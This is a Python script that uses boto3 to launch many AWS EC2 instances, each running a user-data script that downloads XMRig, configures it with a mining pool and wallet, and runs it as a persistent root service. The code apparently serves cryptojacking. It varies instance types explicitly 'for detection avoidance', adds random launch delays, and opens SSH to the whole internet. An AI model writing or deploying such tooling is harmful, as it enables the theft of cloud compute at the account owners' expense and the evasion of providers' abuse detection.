#!/usr/bin/env python3
"""
EC2 Instance Deployment for RM Parametrized Fleet
Deploys EC2 instances with actual XMRig mining software.
"""

import boto3
import json
import logging
import os
import sys
import time
import random
from botocore.exceptions import ClientError

# Add utils to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from utils.resource_tracker import tracker
from utils.helpers import get_latest_cpu_ami
from utils.worker_naming import generate_worker_name

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

def create_key_pair(ec2, region):
    """Create a new key pair for SSH access."""
    key_name = f"rm-parametrized-key-{region}-{int(time.time())}"
    key_pair = ec2.create_key_pair(KeyName=key_name)
    
    # Save the private key to a file
    private_key_file = f"{key_name}.pem"
    with open(private_key_file, 'w') as file:
        file.write(key_pair['KeyMaterial'])
    
    # Set file permissions
    os.chmod(private_key_file, 0o400)
    
    logger.info(f"Created key pair: {key_name}, saved to {private_key_file}")
    return key_name, private_key_file

def update_security_group(ec2, sg_id):
    """Update security group to allow SSH access."""
    try:
        ec2.authorize_security_group_ingress(
            GroupId=sg_id,
            IpPermissions=[
                {
                    'IpProtocol': 'tcp',
                    'FromPort': 22,
                    'ToPort': 22,
                    'IpRanges': [{'CidrIp': '0.0.0.0/0'}]
                }
            ]
        )
        logger.info(f"Updated security group {sg_id} to allow SSH access on port 22")
    except ClientError as e:
        if 'InvalidPermission.Duplicate' in str(e):
            logger.info(f"SSH access already allowed on security group {sg_id}")
        else:
            logger.error(f"Failed to update security group {sg_id}: {e}")

def deploy(region, count, mining_conf, resources):
    """Deploy EC2 instances with XMRig mining software."""
    try:
        ec2 = boto3.client('ec2', region_name=region)
        
        # Log the start of the deployment
        logger.info(f"Starting EC2 deployment in region: {region}")
        
        # Get infrastructure resources
        vpc_resource = tracker.get_resource(region, 'ec2', 'vpc')
        sg_resource = tracker.get_resource(region, 'ec2', 'security-group')
        
        if not vpc_resource or not sg_resource:
            logger.error(f"Infrastructure not found in {region}. Please run aws_dependencies.py first.")
            return False
        
        vpc_id = vpc_resource['id']
        subnet_ids = vpc_resource.get('subnets', [])
        sg_id = sg_resource['id']
        
        if not subnet_ids:
            logger.error(f"No subnets found in {region}")
            return False
        
        # Load settings
        with open('config/fleet_settings.json') as f:
            settings = json.load(f)
        
        # Generate worker name
        worker_name = generate_worker_name('ec2')
        logger.info(f"Using worker name: {worker_name}")
        
        # Create a key pair for SSH access
        key_name, private_key_file = create_key_pair(ec2, region)

        # Update security group to allow SSH access
        update_security_group(ec2, sg_id)
        
        # Generate user data script with XMRig installation
        user_data_script = f'''#!/bin/bash
# RM Parametrized Instance Setup with XMRig
yum update -y
yum install -y git wget curl unzip

# Install XMRig
cd /opt
wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
tar -xzf xmrig-6.21.0-linux-x64.tar.gz
mv xmrig-6.21.0 xmrig
cd xmrig

# Create XMRig configuration
cat > config.json << 'EOF'
{{
    "api": {{
        "port": 0,
        "access-token": null,
        "worker-id": null,
        "ipv6": false,
        "restricted": true
    }},
    "http": {{
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    }},
    "background": false,
    "colors": true,
    "randomx": {{
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": true,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    }},
    "cpu": {{
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 75,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "cn/0": false,
        "cn-lite/0": false
    }},
    "opencl": false,
    "cuda": false,
    "pools": [
        {{
            "algo": "rx/0",
            "coin": null,
            "url": "{mining_conf['pools'][0]}",
            "user": "{mining_conf['wallet']}",
            "pass": "{worker_name}",
            "tls": false,
            "keepalive": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "algorithm": "rx/0"
        }}
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {{
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null,
        "hsts": null,
        "key": null,
        "reuse_session": false,
        "session_cache": false,
        "session_tickets": false,
        "ssl_version": null
    }},
    "user-agent": null,
    "verbose": 0,
    "watch": true
}}
EOF

# Create systemd service for XMRig
cat > /etc/systemd/system/xmrig.service << 'EOF'
[Unit]
Description=XMRig Mining Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/xmrig
ExecStart=/opt/xmrig/xmrig
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Start XMRig service
systemctl daemon-reload
systemctl enable xmrig.service
systemctl start xmrig.service

# Log setup completion
echo "XMRig mining setup completed at $(date)" >> /var/log/xmrig-setup.log
echo "Worker name: {worker_name}" >> /var/log/xmrig-setup.log
echo "Pool: {mining_conf['pools'][0]}" >> /var/log/xmrig-setup.log
'''

        # Deploy instances
        deployed_count = 0
        for i in range(count):
            try:
                # Generate instance name
                instance_name = tracker.generate_resource_name('ec2', region, f"instance{i+1}")
                
                # Vary instance types for detection avoidance
                instance_types = [
                    settings['ec2_instance_type'],
                    'c6i.2xlarge',
                    'c5.2xlarge',
                    'c6a.2xlarge'
                ]
                instance_type = random.choice(instance_types)
                
                # Get AMI
                ami_id = get_latest_cpu_ami(region)
                if not ami_id:
                    logger.error(f"Failed to get AMI for {region}")
                    continue
                
                # Log instance launch command
                logger.info(f"Launching EC2 instance with AMI: {ami_id}, Type: {instance_type}, Subnet: {random.choice(subnet_ids)}, SG: {sg_id}")
                
                # Launch instance
                response = ec2.run_instances(
                    ImageId=ami_id,
                    InstanceType=instance_type,
                    MinCount=1,
                    MaxCount=1,
                    KeyName=key_name,  # Use the created key pair
                    SubnetId=random.choice(subnet_ids),
                    SecurityGroupIds=[sg_id],
                    IamInstanceProfile={'Name': 'RM-Parametrized-EC2Profile'},
                    UserData=user_data_script,
                    TagSpecifications=[{
                        'ResourceType': 'instance',
                        'Tags': [
                            {'Key': 'Name', 'Value': instance_name},
                            {'Key': 'Project', 'Value': tracker.project_tag},
                            {'Key': 'Region', 'Value': region},
                            {'Key': 'InstanceType', 'Value': instance_type},
                            {'Key': 'WorkerName', 'Value': worker_name}
                        ]
                    }],
                    InstanceInitiatedShutdownBehavior='terminate'
                )
                
                instance_id = response['Instances'][0]['InstanceId']
                
                # Log instance creation feedback
                logger.info(f"EC2 instance launched: {instance_id}")
                
                # Track instance
                tracker.add_resource(region, 'ec2', instance_id, 'instance',
                                   name=instance_name, type=instance_type, 
                                   subnet=random.choice(subnet_ids), worker_name=worker_name)
                tracker.add_tags('ec2-instance', instance_id, region, 
                               Name=instance_name, InstanceType=instance_type, WorkerName=worker_name)
                
                logger.info(f"Launched EC2 instance {instance_name} ({instance_id}) in {region}")
                logger.info(f"  Worker name: {worker_name}")
                logger.info(f"  Pool: {mining_conf['pools'][0]}")
                deployed_count += 1
                
                # Add random delay between instances
                if i < count - 1:  # Don't delay after the last instance
                    delay = random.uniform(2, 5)
                    logger.info(f"Random delay: {delay:.2f} seconds")
                    time.sleep(delay)
                
            except ClientError as e:
                logger.error(f"Failed to launch instance {i+1} in {region}: {e}")
                continue
        
        logger.info(f"Successfully deployed {deployed_count}/{count} EC2 instances in {region}")
        logger.info(f"All instances using worker name: {worker_name}")
        return deployed_count > 0
        
    except Exception as e:
        logger.error(f"Error deploying EC2 instances in {region}: {e}")
        return False

if __name__ == "__main__":
    # Test deployment
    with open('config/mining_pools.json') as f:
        mining_conf = json.load(f)
    
    deploy('us-east-1', 1, mining_conf, {})